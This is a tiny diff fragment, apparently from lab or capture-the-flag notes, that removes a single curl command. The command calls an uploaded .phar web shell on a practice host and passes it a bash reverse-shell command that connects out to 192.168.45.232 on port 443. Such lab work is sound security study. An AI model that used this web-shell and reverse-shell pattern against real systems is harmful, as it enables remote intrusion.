@@ -1,5 +1,5 @@
 ```
-curl "http://exfiltrated.offsec/panel/uploads/igjuatapzbgjije.phar?cmd=bash -c "bash -i >& /dev/tcp/192.168.45.232/443 0>&1""
+
 ```
 
 ```
